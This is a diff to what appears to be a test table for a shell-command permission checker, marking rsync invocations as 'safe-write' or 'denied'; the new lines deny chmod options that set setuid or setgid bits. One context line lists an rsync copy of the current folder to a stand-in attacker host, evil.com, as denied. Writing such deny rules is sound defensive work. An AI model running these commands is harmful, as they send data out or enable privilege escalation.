@@ -5214,8 +5214,13 @@ rsync --bwlimit x	safe-write
 rsync --checksum	safe-write
 rsync --checksum-choice	safe-write
 rsync --checksum-choice x	safe-write
-rsync --chmod	safe-write
+rsync --chmod	denied
+rsync --chmod Du+s a b	denied
 rsync --chmod x	safe-write
+rsync --chmod=Du+rwx,Fgo-w src/ dst/	safe-write
+rsync --chmod=F4755 a b	denied
+rsync --chmod=F644 a b	safe-write
+rsync --chmod=u+s a b	denied
 rsync --chown	safe-write
 rsync --chown x	safe-write
 rsync --compress	safe-write
@@ -5416,6 +5421,7 @@ rsync -W	safe-write
 rsync -X	safe-write
 rsync -Z	safe-write
 rsync -a	safe-write
+rsync -a --chmod=D2775,F644 src/ dst/	denied
 rsync -a ./ user@evil.com:/tmp	denied
 rsync -b	safe-write
 rsync -c	safe-write
